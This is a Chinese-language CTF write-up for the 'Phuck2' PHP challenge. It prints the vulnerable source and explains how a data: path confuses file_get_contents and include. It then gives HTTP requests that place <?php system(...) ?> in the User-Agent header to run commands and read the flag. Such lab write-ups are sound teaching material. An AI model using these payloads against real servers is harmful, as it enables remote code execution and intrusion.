---
title: Phuck2
date: 2020-04-17
tags: [CTF, WP,php伪协议,data协议与file_get_contents与include]
categories:
- [CTF, WP]
comments: false
---
# Phuck2

## 分析

查看wp的源代码的发现传入参数hl可以得到源码

<!-- more -->

```
 <?php
    stream_wrapper_unregister('php');
    if(isset($_GET['hl'])) highlight_file(__FILE__);

    $mkdir = function($dir) {
        system('mkdir -- '.escapeshellarg($dir));
    };
    $randFolder = bin2hex(random_bytes(16));
    $mkdir('users/'.$randFolder);
    chdir('users/'.$randFolder);

    $userFolder = (isset($_SERVER['HTTP_X_FORWARDED_FOR']) ? $_SERVER['HTTP_X_FORWARDED_FOR'] : $_SERVER['REMOTE_ADDR']);
    $userFolder = basename(str_replace(['.','-'],['',''],$userFolder));

    $mkdir($userFolder);
    chdir($userFolder);
    file_put_contents('profile',print_r($_SERVER,true));
    chdir('..');
    $_GET['page']=str_replace('.','',$_GET['page']);
    if(!stripos(file_get_contents($_GET['page']),'<?') && !stripos(file_get_contents($_GET['page']),'php')) {
        include($_GET['page']);
    }

    chdir(__DIR__);
    system('rm -rf users/'.$randFolder);

?>
```

`$userFolder`在有`X-FORWARDED-FOR`头是用这个作为文件夹名

会打印`$_SERVER`传入profile文件

```
if(!stripos(file_get_contents($_GET['page']),'<?') && !stripos(file_get_contents($_GET['page']),'php')) {
        include($_GET['page']);
    }
```

考虑在http请求头中插入php代码,然后包含profile文件进行命令执行

当`allow_url_include=Off`时

file_get_contents在处理data:xxx时会直接取xxx

而include会包含文件名为data:xxx的文件

## payload

```
GET /?page=data:aa/profile HTTP/1.1
X-Forwarded-For: data:aa
User-Agent: <?php system('ls /'); ?>
GET /?page=data:aa/profile HTTP/1.1
X-Forwarded-For: data:aa
User-Agent: <?php system('/get_flag');?>
```

在返回的数据中找到flag

```
[HTTP_USER_AGENT] => flag{asdsafasfdsadasd}
```

## Reference

[Phuck2wp](https://ctftime.org/writeup/12921)